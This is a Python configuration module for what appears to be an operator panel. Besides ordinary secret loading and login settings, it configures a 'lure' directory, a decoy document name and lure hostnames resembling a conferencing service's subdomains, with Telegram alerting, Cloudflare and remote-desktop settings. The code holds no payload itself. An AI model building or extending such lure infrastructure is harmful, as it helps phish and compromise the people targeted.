"""Runtime configuration for the panel.

Secrets live in ``/etc/panel/env`` (mode 600) in production. For development and
tests the same keys may come from the process environment. Nothing here ever
logs a secret value.
"""

from __future__ import annotations

import os
import secrets
from dataclasses import dataclass
from pathlib import Path

DEFAULT_ENV_FILE = "/etc/panel/env"


def _parse_env_file(path: Path) -> dict[str, str]:
    values: dict[str, str] = {}
    if not path.is_file():
        return values
    for raw in path.read_text(encoding="utf-8").splitlines():
        line = raw.strip()
        if not line or line.startswith("#") or "=" not in line:
            continue
        key, value = line.split("=", 1)
        values[key.strip()] = value.strip().strip('"').strip("'")
    return values


def _first(*values: str | None) -> str | None:
    for value in values:
        if value:
            return value
    return None


@dataclass(frozen=True)
class Settings:
    env_file: Path
    db_path: Path
    base_dir: Path
    artifacts_dir: Path
    panel_user: str
    panel_pass_hash: str
    panel_secret: str
    panel_totp_secret: str
    session_cookie: str
    session_ttl: int
    cookie_secure: bool
    lockout_max: int
    lockout_seconds: int
    bridge_url: str
    rd_port: int
    rd_bind: str
    public_host: str
    tls_cert: str
    tg_bot_token: str
    tg_chat_id: str
    cf_api_token: str
    cf_zone_name: str
    operator_email: str
    document_name: str
    lure_hosts: list[str]

    @property
    def templates_dir(self) -> Path:
        return self.base_dir / "templates"

    @property
    def static_dir(self) -> Path:
        return self.base_dir / "static"

    @property
    def lure_dir(self) -> Path:
        return self.base_dir / "lure"

    @staticmethod
    def load(env_file: str | None = None) -> Settings:
        env_path = Path(env_file or os.environ.get("PANEL_ENV_FILE", DEFAULT_ENV_FILE))
        file_values = _parse_env_file(env_path)

        def get(key: str, default: str | None = None) -> str | None:
            return _first(os.environ.get(key), file_values.get(key), default)

        base_dir = Path(__file__).resolve().parent
        db_path = Path(get("PANEL_DB", str(base_dir / "var" / "panel.db")) or "")
        db_path.parent.mkdir(parents=True, exist_ok=True)

        secret = get("PANEL_SECRET")
        if not secret:
            secret_file = db_path.parent / "panel.secret"
            if secret_file.is_file():
                secret = secret_file.read_text(encoding="utf-8").strip()
            else:
                secret = secrets.token_urlsafe(48)
                secret_file.write_text(secret, encoding="utf-8")
                secret_file.chmod(0o600)

        pass_hash = get("PANEL_PASS_HASH", "") or ""
        if not pass_hash:
            plaintext = get("PANEL_PASS")
            if plaintext:
                import bcrypt

                pass_hash = bcrypt.hashpw(plaintext.encode(), bcrypt.gensalt(rounds=12)).decode()

        return Settings(
            env_file=env_path,
            db_path=db_path,
            base_dir=base_dir,
            artifacts_dir=Path(get("PANEL_ARTIFACTS", str(base_dir.parent / "artifacts")) or ""),
            panel_user=get("PANEL_USER", "operator") or "operator",
            panel_pass_hash=pass_hash,
            panel_secret=secret,
            panel_totp_secret=get("PANEL_TOTP_SECRET", "") or "",
            session_cookie="fleet_session",
            session_ttl=int(get("PANEL_SESSION_TTL", "86400") or "86400"),
            cookie_secure=(get("PANEL_COOKIE_SECURE", "1") or "1") not in {"0", "false", "no"},
            lockout_max=int(get("PANEL_LOCKOUT_MAX", "5") or "5"),
            lockout_seconds=int(get("PANEL_LOCKOUT_SECONDS", "900") or "900"),
            bridge_url=(get("PANEL_BRIDGE_URL", "http://127.0.0.1:8001") or "").rstrip("/"),
            rd_port=int(get("PANEL_RD_PORT", "8443") or "8443"),
            rd_bind=get("PANEL_RD_BIND", "127.0.0.1") or "127.0.0.1",
            public_host=get("PANEL_PUBLIC_HOST", "localhost") or "localhost",
            tls_cert=get("PANEL_TLS_CERT", "/etc/caddy/certs/panel.crt") or "",
            tg_bot_token=get("TG_BOT_TOKEN", "") or "",
            tg_chat_id=get("TG_CHAT_ID", "") or "",
            cf_api_token=get("CF_API_TOKEN", "") or "",
            cf_zone_name=get("CF_ZONE_NAME", "") or "",
            operator_email=get("OPERATOR_EMAIL", "") or "",
            document_name=get("DOCUMENT_NAME", "Q3 Report") or "Q3 Report",
            lure_hosts=[
                h.strip()
                for h in (
                    get("PANEL_LURE_HOSTS", "get,us01web,us02web,us03web,us04web,us05web") or ""
                ).split(",")
                if h.strip()
            ],
        )
